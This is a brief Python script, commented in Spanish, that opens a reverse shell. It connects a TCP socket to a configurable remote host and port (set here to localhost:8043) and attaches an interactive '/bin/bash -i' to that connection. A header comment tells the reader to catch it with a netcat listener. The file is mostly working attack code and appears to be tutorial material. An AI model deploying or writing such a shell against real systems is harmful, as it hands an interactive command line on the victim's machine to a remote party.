# Creación de una reverse SHELL
# Para poder escuchar utilizar NETCAT -> nc -l RPORT

#Librería para usar sockets
import socket

#Librería subprocess para interactuar con los subprocesos creados
from subprocess import Popen

#Remote Host
RHOST = 'localhost'

#Remote PORT
RPORT = 8043

# La shell inversa; en la ejecución de un subproceso, se usa una array para indicarlo
SHELL = ['/bin/bash', '-i']

# Creamos una nueva instancia y definimos que usamos IPV4 (AF_INET) por el protocolo
# de transporte TCP (SOCK_STREAM)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((RHOST, RPORT))

descriptor = sock.fileno()

Popen(SHELL, stdin=descriptor, stdout=descriptor, stderr=descriptor)
